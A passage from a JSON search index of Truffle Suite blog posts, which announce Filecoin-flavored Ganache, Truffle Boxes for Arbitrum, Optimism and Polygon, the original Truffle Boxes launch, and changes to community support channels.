Filecoin methods to get started with Filecoin development. Like the Ethereum flavor of Ganache, we've made the process as simple as possible for you to get started with Filecoin quickly.", "title": "Filecoin-flavored Ganache"}, {"location": "blog/truffle-and-ganache-now-come-in-filecoin-flavor/#what-can-i-do-with-filecoin-flavored-ganache", "text": "With Filecoin-flavored Ganache, you can do most of the development tasks for building a Filecoin application: - Store and retrieve files from a personal IPFS node that Ganache starts for you - Create a storage deal and see it progress through different states - Test how your application handles storage deal expiration - Transfer Filecoin's token FIL between accounts - Interact with the various Filecoin wallet methods You can find a full list of supported RPC methods on GitHub .", "title": "What can I do with Filecoin-flavored Ganache?"}, {"location": "blog/truffle-and-ganache-now-come-in-filecoin-flavor/#how-do-i-get-started", "text": "If you\u2019re looking to get started with Ganache, head over to the documentation to see Get Started guides whether you're using the NodeJS library, CLI, or graphical UI version. Need an example on how to build a Filecoin application? Check out the Filecoin Truffle Box to see an example to mint NFTs and provide a decentralized art gallery application. We\u2019re finalizing the Truffle documentation in the coming days, so stay tuned for those! When they\u2019re live, you\u2019ll be able to find them at our main documentation page and click on the Filecoin link.", "title": "How do I get started?"}, {"location": "blog/truffle-and-ganache-now-come-in-filecoin-flavor/#where-can-i-get-help", "text": "We're extremely excited to be working with the Filecoin community to add support for Filecoin into Truffle Suite's tooling. If you have questions about our Filecoin integration or our plan for the future, join Truffle\u2019s Discord community & the Filecoin community Slack to get your questions answered. We're happy to help!", "title": "Where can I get help?"}, {"location": "blog/truffle-and-infura-support-arbitrum/", "text": "In our continuing efforts to help build the emerging multi-network Ethereum ecosystem, the Truffle team is thrilled to announce the launch of the Arbitrum Truffle Box. The usability and efficiency of Ethereum depends on scalability, and Arbitrum\u2019s Layer 2 solution blends security and higher throughput to help make scalable Ethereum a reality. Arbitrum \u00b6 Arbitrum is a Layer 2 scaling solution for Ethereum that uses optimistic rollups with interactive proving to make smart contracts scalable, fast, and private. It tracks closely to Ethereum, so that Ethereum developers can easily cross-compile their contracts to deploy on Arbitrum. Arbitrum offers its developers a variety of benefits: trustless security, compatibility with Ethereum, scalability, and cost efficiency. The Arbitrum rollup chain is built on top of and secured by Ethereum. From the developer perspective, interacting with Arbitrum is nearly identical to interacting with Ethereum. Arbitrum supports the same RPC interface as Ethereum, supports all EVM languages, and natively supports all Ethereum tooling without any special adapters. The main difference users and developers will notice is that transactions on Arbitrum cost a fraction of what they would if run natively on Ethereum. It is important to understand the mechanics of withdrawing funds from the Arbitrum chain. When withdrawing to Ethereum through an Arbitrum bridge, there is a delay to ensure that the transactions being rolled up are confirmed. Information about this finality delay and potential methods to avoid it can be found in Arbitrum's documentation here . For more details on Arbitrum\u2019s protocol, see their complete documentation . Introducing The Arbitrum Truffle Box \u00b6 The Truffle Arbitrum Box provides developers with the boilerplate structure necessary to start coding for Arbitrum\u2019s Ethereum Layer 2 solution. We provide the initial building blocks to get started working on Arbitrum without pushing developers to write any particular sort of application. With this box, you will be able to compile, migrate, and test Solidity code against several instances of Arbitrum Networks. Arbitrum\u2019s Layer 2 solution is almost fully compatible with the EVM. The main difference between the EVM and the Arbitrum chain that developers will notice is that some opcodes are different and concepts such as time and gas are handled a little differently. Developers can use their regular Solidity compiler to compile contracts for Arbitrum. You can see the complete list of differences between the Arbitrum L2 chain and Ethereum here . Integration With Infura \u00b6 Our colleagues at Infura are also adding full API support for the Arbitrum network. Infura users can now add the free Arbitrum add-on directly in their Infura dashboard. The Arbitrum network API largely uses the same JSON RPC specification as Ethereum and Infura will support all the necessary API methods for building a fully functional application on the Arbitrum network. For more information on the full support check out the complete documentation . Infura endpoints for the Arbitrum chain are included in the configuration of the Arbitrum Truffle Box, to aid developers in getting fully acquainted with their options when developing for Arbitrum. Where To Get Help \u00b6 You can find all of the documentation for the Truffle Arbitrum Box here . If you have any questions, feedback, or just want to chat, reach out to us through the resources on our community page . We are thrilled to add Arbitrum to the Truffle development suite and can\u2019t wait to see the universe of applications built on Layer 2. Stay tuned as we continue to add more networks, features, and tools that accelerate and simplify development on a secure and scalable Ethereum.", "title": "Truffle and Infura Now Support Arbitrum"}, {"location": "blog/truffle-and-infura-support-arbitrum/#arbitrum", "text": "Arbitrum is a Layer 2 scaling solution for Ethereum that uses optimistic rollups with interactive proving to make smart contracts scalable, fast, and private. It tracks closely to Ethereum, so that Ethereum developers can easily cross-compile their contracts to deploy on Arbitrum. Arbitrum offers its developers a variety of benefits: trustless security, compatibility with Ethereum, scalability, and cost efficiency. The Arbitrum rollup chain is built on top of and secured by Ethereum. From the developer perspective, interacting with Arbitrum is nearly identical to interacting with Ethereum. Arbitrum supports the same RPC interface as Ethereum, supports all EVM languages, and natively supports all Ethereum tooling without any special adapters. The main difference users and developers will notice is that transactions on Arbitrum cost a fraction of what they would if run natively on Ethereum. It is important to understand the mechanics of withdrawing funds from the Arbitrum chain. When withdrawing to Ethereum through an Arbitrum bridge, there is a delay to ensure that the transactions being rolled up are confirmed. Information about this finality delay and potential methods to avoid it can be found in Arbitrum's documentation here . For more details on Arbitrum\u2019s protocol, see their complete documentation .", "title": "Arbitrum"}, {"location": "blog/truffle-and-infura-support-arbitrum/#introducing-the-arbitrum-truffle-box", "text": "The Truffle Arbitrum Box provides developers with the boilerplate structure necessary to start coding for Arbitrum\u2019s Ethereum Layer 2 solution. We provide the initial building blocks to get started working on Arbitrum without pushing developers to write any particular sort of application. With this box, you will be able to compile, migrate, and test Solidity code against several instances of Arbitrum Networks. Arbitrum\u2019s Layer 2 solution is almost fully compatible with the EVM. The main difference between the EVM and the Arbitrum chain that developers will notice is that some opcodes are different and concepts such as time and gas are handled a little differently. Developers can use their regular Solidity compiler to compile contracts for Arbitrum. You can see the complete list of differences between the Arbitrum L2 chain and Ethereum here .", "title": "Introducing The Arbitrum Truffle Box"}, {"location": "blog/truffle-and-infura-support-arbitrum/#integration-with-infura", "text": "Our colleagues at Infura are also adding full API support for the Arbitrum network. Infura users can now add the free Arbitrum add-on directly in their Infura dashboard. The Arbitrum network API largely uses the same JSON RPC specification as Ethereum and Infura will support all the necessary API methods for building a fully functional application on the Arbitrum network. For more information on the full support check out the complete documentation . Infura endpoints for the Arbitrum chain are included in the configuration of the Arbitrum Truffle Box, to aid developers in getting fully acquainted with their options when developing for Arbitrum.", "title": "Integration With Infura"}, {"location": "blog/truffle-and-infura-support-arbitrum/#where-to-get-help", "text": "You can find all of the documentation for the Truffle Arbitrum Box here . If you have any questions, feedback, or just want to chat, reach out to us through the resources on our community page . We are thrilled to add Arbitrum to the Truffle development suite and can\u2019t wait to see the universe of applications built on Layer 2. Stay tuned as we continue to add more networks, features, and tools that accelerate and simplify development on a secure and scalable Ethereum.", "title": "Where To Get Help"}, {"location": "blog/truffle-and-infura-support-optimism/", "text": "Developer demand for scalable Ethereum application development tooling continues to grow. The multi-network Ethereum ecosystem is here, and Layer 2 solutions such as Optimistic Ethereum are leading the way. The Truffle team is delighted to support Optimistic Ethereum in helping developers build for this ecosystem. Today we are announcing the launch of the new Truffle Optimism Box. Optimistic Ethereum \u00b6 Optimistic Ethereum is a Layer 2 scaling protocol for Ethereum applications. It is an application inside of Ethereum that executes transactions more efficiently than Ethereum itself, based on the concept of an Optimistic Rollup . The Optimistic Ethereum security model is backed by a system of \u201cfraud proofs\u201d that allow users to identify bad transaction results to support the accuracy of the data that is eventually rolled up and published to the main Ethereum chain. Transactions on Optimistic Ethereum are handled similarly to those on the Ethereum mainnet, and bridging between Optimistic Ethereum and mainnet Ethereum allows users to conduct gas-intensive operations on Optimistic Ethereum for a fraction of the cost. Optimistic Ethereum tracks closely to the structure and operation of the Ethereum mainnet, preserving security guarantees while increasing throughput and decreasing transaction costs. Important to note, this protocol requires a delay for bridging funds from Optimism back to Ethereum, and you can find more information about that here . Existing Solidity smart contracts can run on Optimistic Ethereum with minimal differences. Off-chain code such as user interfaces and wallets will need to update their RPC endpoints to interact with Optimistic Ethereum, and will largely just work once the update is made. For detailed documentation on the Optimistic Ethereum protocol, see here and here . Introducing the Truffle Optimism Box \u00b6 The Truffle Optimism Box provides developers with the boilerplate structure necessary to start coding for Optimism\u2019s Ethereum Layer 2 solution. We provide the initial building blocks to get to work on Optimistic Ethereum without pushing developers to write any particular sort of application. With this box, you will be able to compile, migrate, and test Solidity code against several instances of Optimistic Ethereum networks. Optimism\u2019s Layer 2 solution is almost fully compatible with the EVM, though it uses an \u201coptimistic\u201d EVM called the OVM. The main difference between the EVM and the OVM that developers will notice is that some opcodes are not available for contracts that are deployed to the OVM. The Truffle Optimism Box is complete with the Optimistic solc compiler already referenced in the truffle-config.ovm.js file. You can see a complete list of differences between Optimism\u2019s fork of the solc compiler and the original here . Integration With Infura \u00b6 Our colleagues at Infura are also adding full API support for the Optimistic Ethereum network. Infura users can now add the free Optimism add-on directly in their Infura dashboard. The Optimism network API largely uses the same JSON RPC specification as Ethereum and Infura will support all the necessary API methods for building a fully functional application on the Optimistic Ethereum network. For more information on the full support check out the complete documentation . Infura endpoints for the Optimistic Ethereum chain are included in the configuration of the Optimism Truffle Box, to aid developers in getting fully acquainted with their options when developing for the Optimistic Ethereum chain. Where to Get Help \u00b6 You can find all of the documentation for the Truffle Optimism Box here . If you have any questions, feedback, or just want to chat, reach out to us through the resources on our community page . We are thrilled to add Optimistic Ethereum to the Truffle development suite and can\u2019t wait to see the universe of applications built on Layer 2. Stay tuned as we continue to add more networks, features, and tools that accelerate and simplify development on a secure and scalable Ethereum.", "title": "Truffle and Infura Now Support Optimism"}, {"location": "blog/truffle-and-infura-support-optimism/#optimistic-ethereum", "text": "Optimistic Ethereum is a Layer 2 scaling protocol for Ethereum applications. It is an application inside of Ethereum that executes transactions more efficiently than Ethereum itself, based on the concept of an Optimistic Rollup . The Optimistic Ethereum security model is backed by a system of \u201cfraud proofs\u201d that allow users to identify bad transaction results to support the accuracy of the data that is eventually rolled up and published to the main Ethereum chain. Transactions on Optimistic Ethereum are handled similarly to those on the Ethereum mainnet, and bridging between Optimistic Ethereum and mainnet Ethereum allows users to conduct gas-intensive operations on Optimistic Ethereum for a fraction of the cost. Optimistic Ethereum tracks closely to the structure and operation of the Ethereum mainnet, preserving security guarantees while increasing throughput and decreasing transaction costs. Important to note, this protocol requires a delay for bridging funds from Optimism back to Ethereum, and you can find more information about that here . Existing Solidity smart contracts can run on Optimistic Ethereum with minimal differences. Off-chain code such as user interfaces and wallets will need to update their RPC endpoints to interact with Optimistic Ethereum, and will largely just work once the update is made. For detailed documentation on the Optimistic Ethereum protocol, see here and here .", "title": "Optimistic Ethereum"}, {"location": "blog/truffle-and-infura-support-optimism/#introducing-the-truffle-optimism-box", "text": "The Truffle Optimism Box provides developers with the boilerplate structure necessary to start coding for Optimism\u2019s Ethereum Layer 2 solution. We provide the initial building blocks to get to work on Optimistic Ethereum without pushing developers to write any particular sort of application. With this box, you will be able to compile, migrate, and test Solidity code against several instances of Optimistic Ethereum networks. Optimism\u2019s Layer 2 solution is almost fully compatible with the EVM, though it uses an \u201coptimistic\u201d EVM called the OVM. The main difference between the EVM and the OVM that developers will notice is that some opcodes are not available for contracts that are deployed to the OVM. The Truffle Optimism Box is complete with the Optimistic solc compiler already referenced in the truffle-config.ovm.js file. You can see a complete list of differences between Optimism\u2019s fork of the solc compiler and the original here .", "title": "Introducing the Truffle Optimism Box"}, {"location": "blog/truffle-and-infura-support-optimism/#integration-with-infura", "text": "Our colleagues at Infura are also adding full API support for the Optimistic Ethereum network. Infura users can now add the free Optimism add-on directly in their Infura dashboard. The Optimism network API largely uses the same JSON RPC specification as Ethereum and Infura will support all the necessary API methods for building a fully functional application on the Optimistic Ethereum network. For more information on the full support check out the complete documentation . Infura endpoints for the Optimistic Ethereum chain are included in the configuration of the Optimism Truffle Box, to aid developers in getting fully acquainted with their options when developing for the Optimistic Ethereum chain.", "title": "Integration With Infura"}, {"location": "blog/truffle-and-infura-support-optimism/#where-to-get-help", "text": "You can find all of the documentation for the Truffle Optimism Box here . If you have any questions, feedback, or just want to chat, reach out to us through the resources on our community page . We are thrilled to add Optimistic Ethereum to the Truffle development suite and can\u2019t wait to see the universe of applications built on Layer 2. Stay tuned as we continue to add more networks, features, and tools that accelerate and simplify development on a secure and scalable Ethereum.", "title": "Where to Get Help"}, {"location": "blog/truffle-and-infura-support-polygon/", "text": "The developer demand for scaling solutions that work directly with Ethereum is here and growing, so today we are very excited to launch the new Polygon Truffle Box. Ethereum-based dapp development is rapidly entering a new phase wherein a multi-network future is certain and Layer 2 solutions like Polygon's are leading the charge into this uncharted territory. Layer 2 scaling is essential to the health of the Ethereum ecosystem, and the Truffle team is delighted to support the Polygon PoS chain in helping developers build toward this future. Polygon PoS Chain \u00b6 Polygon PoS is a hybrid Plasma Proof-of-Stake sidechain to the Ethereum mainnet which consists of a Tendermint consensus validator layer and a Plasma sidechain for block production. This configuration allows for higher transaction throughput, lower gas fees, and through Polygon's established bridges, easy connection back to the Ethereum mainnet. Introducing the Polygon Truffle Box \u00b6 The core component of this new tooling is the Truffle Polygon Box . This new Truffle box provides you with the boilerplate structure necessary to start coding for Polygon's Ethereum L2 solution, the Polygon PoS chain (previously the Matic PoS chain). For detailed information on how the Polygon PoS chain works, please see their documentation here . We provide the initial building blocks needed to get to work on Polygon PoS without pushing developers to write any particular sort of application. With this box, you will be able to compile, migrate, and test Solidity code against several instances of Polygon PoS networks. Polygon's L2 solution is fully compatible with the EVM. This means you will not need a new compiler to deploy Solidity contracts, and should be able to add your own Solidity contracts to this project. The main difference developers will encounter is in accessing and interacting with the Polygon PoS network. Additionally, Polygon offers multiple ways for dapp developers to implement communication between Ethereum (\"Layer 1\") and the Polygon PoS chain. Further information about how to enable Ethereum-Polygon communication can be found in the Polygon documentation here . A quick note about naming: The Polygon ecosystem was previously called Matic Network. The chain to which we'll be deploying in the Polygon Truffle Box is now called the Polygon PoS chain. We have named this box the Polygon Box because we expect to include the ability to deploy to future Polygon chains in addition to what is presented in the initial Polygon Box, and developers using this Box may find themselves incorporating additional aspects of the Polygon ecosystem in their work. Integration With Infura \u00b6 Our colleagues at Infura are also adding full API support for the Polygon network. Infura users can now add the free Polygon Network add-on directly in their Infura dashboard. The Polygon network API largely utilizes the same JSON RPC specification as Ethereum and Infura will support all the necessary API methods for building a fully functional application on the Polygon network. For more information on the full support check out the complete documentation . Infura endpoints for the Polygon PoS chain are included in the configuration of the Polygon Truffle Box, to aid developers in getting fully acquainted with their options when developing for the Polygon PoS chain. Where to Get Help \u00b6 You can find all of the documentation for the Truffle Polygon box here . If you have any questions, feedback, or just want to chat, reach out to us through the resources on our community page . We are very excited to add Polygon PoS to our development suite and we can't wait to see all of the amazing applications built with these tools. Stay tuned as we continue to add more networks, features, and products that accelerate and simplify development on this exciting new technology.", "title": "Truffle and Infura Now Support Polygon"}, {"location": "blog/truffle-and-infura-support-polygon/#polygon-pos-chain", "text": "Polygon PoS is a hybrid Plasma Proof-of-Stake sidechain to the Ethereum mainnet which consists of a Tendermint consensus validator layer and a Plasma sidechain for block production. This configuration allows for higher transaction throughput, lower gas fees, and through Polygon's established bridges, easy connection back to the Ethereum mainnet.", "title": "Polygon PoS Chain"}, {"location": "blog/truffle-and-infura-support-polygon/#introducing-the-polygon-truffle-box", "text": "The core component of this new tooling is the Truffle Polygon Box . This new Truffle box provides you with the boilerplate structure necessary to start coding for Polygon's Ethereum L2 solution, the Polygon PoS chain (previously the Matic PoS chain). For detailed information on how the Polygon PoS chain works, please see their documentation here . We provide the initial building blocks needed to get to work on Polygon PoS without pushing developers to write any particular sort of application. With this box, you will be able to compile, migrate, and test Solidity code against several instances of Polygon PoS networks. Polygon's L2 solution is fully compatible with the EVM. This means you will not need a new compiler to deploy Solidity contracts, and should be able to add your own Solidity contracts to this project. The main difference developers will encounter is in accessing and interacting with the Polygon PoS network. Additionally, Polygon offers multiple ways for dapp developers to implement communication between Ethereum (\"Layer 1\") and the Polygon PoS chain. Further information about how to enable Ethereum-Polygon communication can be found in the Polygon documentation here . A quick note about naming: The Polygon ecosystem was previously called Matic Network. The chain to which we'll be deploying in the Polygon Truffle Box is now called the Polygon PoS chain. We have named this box the Polygon Box because we expect to include the ability to deploy to future Polygon chains in addition to what is presented in the initial Polygon Box, and developers using this Box may find themselves incorporating additional aspects of the Polygon ecosystem in their work.", "title": "Introducing the Polygon Truffle Box"}, {"location": "blog/truffle-and-infura-support-polygon/#integration-with-infura", "text": "Our colleagues at Infura are also adding full API support for the Polygon network. Infura users can now add the free Polygon Network add-on directly in their Infura dashboard. The Polygon network API largely utilizes the same JSON RPC specification as Ethereum and Infura will support all the necessary API methods for building a fully functional application on the Polygon network. For more information on the full support check out the complete documentation . Infura endpoints for the Polygon PoS chain are included in the configuration of the Polygon Truffle Box, to aid developers in getting fully acquainted with their options when developing for the Polygon PoS chain.", "title": "Integration With Infura"}, {"location": "blog/truffle-and-infura-support-polygon/#where-to-get-help", "text": "You can find all of the documentation for the Truffle Polygon box here . If you have any questions, feedback, or just want to chat, reach out to us through the resources on our community page . We are very excited to add Polygon PoS to our development suite and we can't wait to see all of the amazing applications built with these tools. Stay tuned as we continue to add more networks, features, and products that accelerate and simplify development on this exciting new technology.", "title": "Where to Get Help"}, {"location": "blog/truffle-boxes-making-life-sweeter/", "text": "When users begin developing on Ethereum, the first question they ask is, \"Where do I start?\". In the past, there hasn't been an easy answer: the answer generally consisted of many flavors of \"it depends\", and usually led to an investigation of what the user was trying to build, a general overview of their development skills, their knowledge of Ethereum, and the libraries and tools they're already most comfortable with. When determining how the Truffle team can help in this process, it quickly became apparent that what our users needed were examples. Many of them. So, being the upstanding community members we are, we set out to create those example, and today, we're happy to show you what we've accomplished. Introducing Truffle Boxes! \u00b6 A Truffle box is an example Ethereum application and/or boilerplate that puts complimentary tools and libraries into a single, sweet, easily-downloadable package. Every Truffle box comes with libraries and tools already preinstalled, code that uses those libraries and tools, external scripts (if necessary), as well as helpful README's and documentation. All Truffle boxes are directly integrated into the Truffle command line, and you need only type truffle unbox <box name> to download and prepare your box of choice. Click here for a list of all available boxes. Ensure you've installed the latest version of Truffle before opening your first box. Today's release comes with three officially-supported boxes, as well as one community-supported box. Our officially-supported boxes are: react : A box that pairs Truffle with React in an easy to understand structure, meant for a web-based Ethereum application. react-auth : Our react box with extra goodies for authentication powered by smart contracts. react-uport : Like react-auth , but authentication is powered by Uport. Perhaps the most exciting part of this release -- our pi\u00e8ce de r\u00e9sistance -- is the Status Truffle box , our first community-supported box. This box was created by the Status team, and instantly links Truffle and Status together with an example application and all the tools and libraries you need to build your own Status dapp. Get Involved: Make Your Own Box \u00b6 We've released four boxes out of the gate to get you started, but this isn't just our candy store. We want you to contribute to the boxes on our site. If you have boilerplate code, an example dapp, a helpful integration or an exciting dapp stack (say, an Ethereum-enabled iOS app built with Truffle), send us an email at boxes@trufflesuite.com and we'll look it over. If it's awesome, we'll list it on our site with your name front and center. If it's better than awesome, we'll help contribute and maintain it and make it an officially-supported Truffle box. With Truffle, you can share your code with others and help build the community, one box at a time. One More thing... \u00b6 There's always one more thing. Fair warning, this one's techy. Right now, all the boxes you're seeing are static pages showing off what we and the Status team have built. Soon, however, we'll be taking on the ultimate challenge and will be creating a Truffle box registry, built on top of Ethereum, to help market and promote our community-supported boxes. Of course we'll be using Truffle, which adds a whole new layer of sweetness. Stay tuned for more details about the registry and how you can use the Ethereum blockchain to become a Truffle contributor. As always, we thank everyone for your support, and would love to hear from you. Don't hesitate to reach out on our community GitHub Discussions channel where hundreds of your fellow Trufflers congregate to answer your questions. Cheers! -- Tim & the Truffle Team", "title": "Truffle Boxes - Making Life Sweeter"}, {"location": "blog/truffle-boxes-making-life-sweeter/#introducing-truffle-boxes", "text": "A Truffle box is an example Ethereum application and/or boilerplate that puts complimentary tools and libraries into a single, sweet, easily-downloadable package. Every Truffle box comes with libraries and tools already preinstalled, code that uses those libraries and tools, external scripts (if necessary), as well as helpful README's and documentation. All Truffle boxes are directly integrated into the Truffle command line, and you need only type truffle unbox <box name> to download and prepare your box of choice. Click here for a list of all available boxes. Ensure you've installed the latest version of Truffle before opening your first box. Today's release comes with three officially-supported boxes, as well as one community-supported box. Our officially-supported boxes are: react : A box that pairs Truffle with React in an easy to understand structure, meant for a web-based Ethereum application. react-auth : Our react box with extra goodies for authentication powered by smart contracts. react-uport : Like react-auth , but authentication is powered by Uport. Perhaps the most exciting part of this release -- our pi\u00e8ce de r\u00e9sistance -- is the Status Truffle box , our first community-supported box. This box was created by the Status team, and instantly links Truffle and Status together with an example application and all the tools and libraries you need to build your own Status dapp.", "title": "Introducing Truffle Boxes!"}, {"location": "blog/truffle-boxes-making-life-sweeter/#get-involved-make-your-own-box", "text": "We've released four boxes out of the gate to get you started, but this isn't just our candy store. We want you to contribute to the boxes on our site. If you have boilerplate code, an example dapp, a helpful integration or an exciting dapp stack (say, an Ethereum-enabled iOS app built with Truffle), send us an email at boxes@trufflesuite.com and we'll look it over. If it's awesome, we'll list it on our site with your name front and center. If it's better than awesome, we'll help contribute and maintain it and make it an officially-supported Truffle box. With Truffle, you can share your code with others and help build the community, one box at a time.", "title": "Get Involved: Make Your Own Box"}, {"location": "blog/truffle-boxes-making-life-sweeter/#one-more-thing", "text": "There's always one more thing. Fair warning, this one's techy. Right now, all the boxes you're seeing are static pages showing off what we and the Status team have built. Soon, however, we'll be taking on the ultimate challenge and will be creating a Truffle box registry, built on top of Ethereum, to help market and promote our community-supported boxes. Of course we'll be using Truffle, which adds a whole new layer of sweetness. Stay tuned for more details about the registry and how you can use the Ethereum blockchain to become a Truffle contributor. As always, we thank everyone for your support, and would love to hear from you. Don't hesitate to reach out on our community GitHub Discussions channel where hundreds of your fellow Trufflers congregate to answer your questions. Cheers! -- Tim & the Truffle Team", "title": "One More thing..."}, {"location": "blog/truffle-community-updates-improving-developer-engagement/", "text": "By Emily Lin At Truffle, we understand that our product is only as strong as our community. A vibrant community gives us a consistent feedback loop that helps us understand and solve developers\u2019 most challenging pain-points. Ultimately, our job is to make development as painless as possible, because the success of Web3 relies on those imagining and building the next generation of dapps! This post explains the steps Truffle is taking in order to grow and connect with the dapp developer community. GitHub Discussions and Issues \u00b6 In our previous blog post, Introducing Github Discussions! , we talked about streamlining support as our first step to supporting the developer community. However, these channels not only help developers in their existing workflows, but also provide opportunities for them to give feedback on and contribute to Truffle\u2019s open source code. GitHub Discussions includes an \u201cideas\u201d category to provide a platform for Trufflers to spitball and ruminate over different tooling improvements. Similarly, Github Issues allows developers to create explicit feature requests or contribute to Truffle\u2019s codebase themselves to help us build as fast as possible. We are in the process of tightening the feedback loop for improving Truffle\u2019s tooling by putting it all in one place: our GitHub! Discord \u00b6 We\u2019re also working on shifting Discord\u2019s purpose towards project discussions, general community engagement, and the latest happenings at Truffle by retiring #truffle-support. Discord should be a place for you to gush over the latest project you\u2019re working on. Or connect with fellow Trufflers interested in building alongside you, and talk about how Truffle is helping you in your developer journey! Join our Discord , and tell us all about it! We\u2019re so excited to see how the Web3 community is learning and growing. Community Calls \u00b6 Improving developer engagement does not only entail fostering the relationships between community members, but also ensures that there is a strong, direct relationship with the Truffle team itself! That\u2019s why we\u2019re starting a monthly Community Call that will be a live stream covering a variety of topics such as: Live-coded workshops so you can learn and watch us troubleshoot any bugs. Direct interactions and interviews through chat with our team about what Truffle is doing. Developer highlights that feature those dreaming and building big in the Web3 space. Our first live stream had over 1,700+ live attendees and 300+ replays. We can\u2019t wait to see this grow over time. Our first official Community Be sure to follow us on Twitter to be informed on our next one and how to register! IRL Events \u00b6 Truffle is also upping its presence at various conferences, as we recognize there exist intangible moments IRL to connect with our community. There\u2019s nothing like meeting face-to-face to learn and support each other as we grow the Truffle community. Lines of communication are clearer, questions can be answered more quickly, and of course, Truffle swag is distributed for you to represent your favorite developer tools! Our involvement with EthShanghai and NFT.NYC has been invaluable, and we\u2019d love to meet you guys at F3STIVAL, EthCC, and Devcon. Again, follow us on Twitter to get the latest on hackathon bounties we\u2019re offering or simply just catching us in person! Educational Content \u00b6 Web3 will not grow unless developers are equipped with the knowledge and skills to create dapps. Truffle is leveling up its content production - bringing you educational tutorials, demos, and best practices through YouTube, TikTok, blogs, and guides. Stay tuned for partner content too as Truffle will be featured in the Decrypt Web3 Dev Series and is currently featured in Eat The Blocks and Clever Programmer. Truffle\u2019s mandate is to do whatever it takes to build a better ecosystem. We were the first smart contract developer tooling to ever exist, putting out the canonical Pet Shop tutorial to build your first dapp. We\u2019re ecstatic to see how much the space has grown and changed over the years and recognize a need for a Pet Shop refresh. Keep an eye out for \u201cweb3-unleashed\u201d - a call-back to our roots and new educational series that will teach and refine your smart contract development skills through a series of relevant applications, taking you from beginner to expert to dive into the world of Web3! Get involved! \u00b6 There\u2019s a never-ending amount of things to learn, do, and contribute to Web3, and here at Truffle, we\u2019re excited to be with builders every step of the way. Let us know how we can make your lives easier by submitting ideas and feedback through GitHub discussions and issues. Learn and grow with fellow developers on Truffle\u2019s Discord channels. Join our Community Call to directly engage with the Truffle team. And, as we publish content, be on the lookout for participation-based NFTs, and let us know how we can help sharpen your developer skills!", "title": "Truffle Community Updates - Improving Developer Engagement"}, {"location": "blog/truffle-community-updates-improving-developer-engagement/#github-discussions-and-issues", "text": "In our previous blog post, Introducing Github Discussions! , we talked about streamlining support as our first step to supporting the developer community. However, these channels not only help developers in their existing workflows, but also provide opportunities for them to give feedback on and contribute to Truffle\u2019s open source code. GitHub Discussions includes an \u201cideas\u201d category to provide a platform for Trufflers to spitball and ruminate over different tooling improvements. Similarly, Github Issues allows developers to create explicit feature requests or contribute to Truffle\u2019s codebase themselves to help us build as fast as possible. We are in the process of tightening the feedback loop for improving Truffle\u2019s tooling by putting it all in one place: our GitHub!", "title": "GitHub Discussions and Issues"}, {"location": "blog/truffle-community-updates-improving-developer-engagement/#discord", "text": "We\u2019re also working on shifting Discord\u2019s purpose towards project discussions, general community engagement, and the latest happenings at Truffle by retiring #truffle-support. Discord should be a place for you to gush over the latest project you\u2019re working on. Or connect with fellow Trufflers interested in building alongside you, and talk about how Truffle is helping you in your developer journey! Join our Discord , and tell us all about it! We\u2019re so excited to see how the Web3 community is learning and growing.", "title": "Discord"}, {"location": "blog/truffle-community-updates-improving-developer-engagement/#community-calls", "text": "Improving developer engagement does not only entail fostering the relationships between community members, but also ensures that there is a strong, direct relationship with the Truffle team itself! That\u2019s why we\u2019re starting a monthly Community Call that will be a live stream covering a variety of topics such as: Live-coded workshops so you can learn and watch us troubleshoot any bugs. Direct interactions and interviews through chat with our team about what Truffle is doing. Developer highlights that feature those dreaming and building big in the Web3 space. Our first live stream had over 1,700+ live attendees and 300+ replays. We can\u2019t wait to see this grow over time. Our first official Community Be sure to follow us on Twitter to be informed on our next one and how to register!", "title": "Community Calls"}, {"location": "blog/truffle-community-updates-improving-developer-engagement/#irl-events", "text": "Truffle is also upping its presence at various conferences, as we recognize there exist intangible moments IRL to connect with our community. There\u2019s nothing like meeting face-to-face to learn and support each other as we grow the Truffle community. Lines of communication are clearer, questions can be answered more quickly, and of course, Truffle swag is distributed for you to represent your favorite developer tools! Our involvement with EthShanghai and NFT.NYC has been invaluable, and we\u2019d love to meet you guys at F3STIVAL, EthCC, and Devcon. Again, follow us on Twitter to get the latest on hackathon bounties we\u2019re offering or simply just catching us in person!", "title": "IRL Events"}, {"location": "blog/truffle-community-updates-improving-developer-engagement/#educational-content", "text": "Web3 will not grow unless developers are equipped with the knowledge and skills to create dapps. Truffle is leveling up its content production - bringing you educational tutorials, demos, and best practices through YouTube, TikTok, blogs, and guides. Stay tuned for partner content too as Truffle will be featured in the Decrypt Web3 Dev Series and is currently featured in Eat The Blocks and Clever Programmer. Truffle\u2019s mandate is to do whatever it takes to build a better ecosystem. We were the first smart contract developer tooling to ever exist, putting out the canonical Pet Shop tutorial to build your first dapp. We\u2019re ecstatic to see how much the space has grown and changed over the years and recognize a need for a Pet Shop refresh. Keep an eye out for \u201cweb3-unleashed\u201d - a call-back to our roots and new educational series that will teach and refine your smart contract development skills through a series of relevant applications, taking you from beginner to expert to dive into the world of Web3!", "title": "Educational Content"}, {"location": "blog/truffle-community-updates-improving-developer-engagement/#get-involved", "text": "There\u2019s a never-ending amount of things to learn, do, and contribute to Web3, and here at Truffle, we\u2019re excited to be with builders every step of the way. Let us know how we can make your lives easier by submitting ideas and feedback through GitHub discussions and issues. Learn and grow with fellow developers on Truffle\u2019s Discord channels. Join our Community Call to directly engage with the Truffle team. And, as we publish content, be on the lookout for participation-based NFTs, and let us know how we can help sharpen your developer skills!", "title": "Get involved!"}, {"location": "blog/truffle-community-updates-introducing-github-discussions/", "text": "By Emily Lin At Truffle, our goal is to fuel the growth of Web3 through the expansion, support, and cultivation of the dapp developer community and tooling ecosystem. As such, we\u2019re retiring our fragmented support channels in favor of GitHub discussions! This post seeks to explain our motivations for doing so and what this means for the Truffle developer community. Challenges \u00b6 Before GitHub discussions Truffle provided support through several different platforms: Gitter Discourse Discord r/truffle GitHub issues Spectrum Zendesk support tickets Email This presented three major problems. On the developer side, it was unclear where to go to find help. It was also difficult to find out if questions had been answered before. On Truffle\u2019s side, the overhead in monitoring all these different channels made it difficult to provide the first-class support that our robust developer community needs. Overall, this lack of clarity in where to go for what meant that opportunities for community building and feedback could get lost in a sea of support requests. Now, it\u2019s time for a new approach! Our goals to manage the Truffle community are as followed: Know exactly where to go for questions Can search historical data to see if questions have already been answered Have their questions answered within 24 hours Have a platform to express feedback and ideas Can collaborate and bond with other developers Evaluated Channels \u00b6 When analyzing the tools we had at hand, we decided between Discord and GitHub Discussions for support. We considered Discord because: Live chat seemed like it could provide faster response times We could separate topics into various channels It\u2019s a popular means of support amongst other Web3 developer communities However, Discord was not an ideal solution because the search functionality was not robust enough. If a developer Googled a problem, Discord answers would not be discoverable. Also, the chat could get noisy, as users are, by 